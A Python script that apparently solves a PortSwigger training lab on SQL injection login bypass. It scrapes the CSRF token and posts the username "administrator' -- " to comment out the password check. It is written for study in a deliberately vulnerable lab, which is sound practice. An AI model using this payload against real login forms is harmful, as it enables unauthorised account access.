#!/usr/bin/env python3
# Lab: SQL injection vulnerability allowing login bypass
# Lab-Link: <https://portswigger.net/web-security/sql-injection/lab-login-bypass>  # noqa
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, uri):
    r = client.get(uri)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def exploit(host, username, password):
    url = f'{host}/login'

    client = requests.Session()
    client.proxies = proxies
    client.verify = False

    csrf = get_csrf_token(client, url)
    if len(csrf) > 0:
        print(f'[+] Found CSRF token')
    else:
        print(f'[-] No CSRF token found')

    username = username if len(username) > 0 else 'anyUsername'
    password = password if len(password) > 0 else 'anyPassword'
    payload = {'csrf': csrf,
               'username': username,
               'password': password}
               
    r = client.post(url, data=payload, allow_redirects=True)
    return 'Congratulations, you solved the lab!' in r.text


if __name__ == "__main__":
    print('[+] SQL injection vulnerability allowing login bypass')
    try:
        host = sys.argv[1].strip().rstrip('/')
        # username = sys.argv[2].strip()
        # password = sys.argv[3].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <host> <username> <password>')
        print(f'[-] Example: {sys.argv[0]} http://www.example.com "administrator" "password"')  # noqa E501languageserver
        sys.exit(-1)

    username = "administrator' -- "
    password = 'anyPassword'

    if exploit(host, username, password):
        print('[+] Injection successful')
    else:
        print('[-] Injection not successful')
